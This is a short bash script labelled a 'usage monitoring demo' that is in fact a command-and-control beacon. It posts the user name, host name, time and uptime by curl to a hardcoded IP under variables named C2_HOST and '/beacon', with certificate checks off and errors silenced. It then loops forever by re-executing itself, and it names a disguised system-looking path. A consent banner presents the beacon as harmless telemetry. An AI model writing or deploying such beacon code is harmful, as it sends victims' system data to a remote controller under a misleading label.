#!/usr/bin/env bash
# Usage Monitoring Demo – SleepTheGod @portknock
# This script phones home to collect basic usage stats (IP, timestamp, hostname, etc.)
# By running this you consent to your IP and basic system info being logged.

set -euo pipefail 2>/dev/null

C2_HOST="173.249.20.58"
C2_PORT="443"
C2_PATH="/beacon"               # should point to the PHP file above

SELF_NAME="/usr/lib/.private-systemd-sync"
BEACON_INTERVAL=300             # much slower for legitimate monitoring

main() {
    # Show consent once
    if [ ! -f /tmp/.usage-notice-shown ]; then
        cat <<'NOTICE'
┌────────────────────────────────────────────────────────────┐
│ IMPORTANT NOTICE                                           │
│ This script sends basic usage telemetry to the author:     │
│   • Your IP address                                        │
│   • Timestamp                                              │
│   • Hostname & basic system info                           │
│ No personal files or keystrokes are collected.             │
│ Running this script means you agree to this logging.       │
└────────────────────────────────────────────────────────────┘
NOTICE
        read -p "Continue? (y/N): " ans
        [[ "$ans" =~ ^[Yy]$ ]] || exit 0
        touch /tmp/.usage-notice-shown
    fi

    local payload
    payload="$(whoami)@$(hostname) [$(date '+%Y-%m-%d %H:%M:%S')] PID=$$ $(uptime | cut -d',' -f1)"

    curl -skm 10 \
        -H "User-Agent: UsageMonitor/1.0" \
        --data-urlencode "q=${payload}" \
        "https://${C2_HOST}:${C2_PORT}${C2_PATH}" >/dev/null 2>&1 || true

    sleep $BEACON_INTERVAL
    exec "$0" "$@"
}

main "$@"
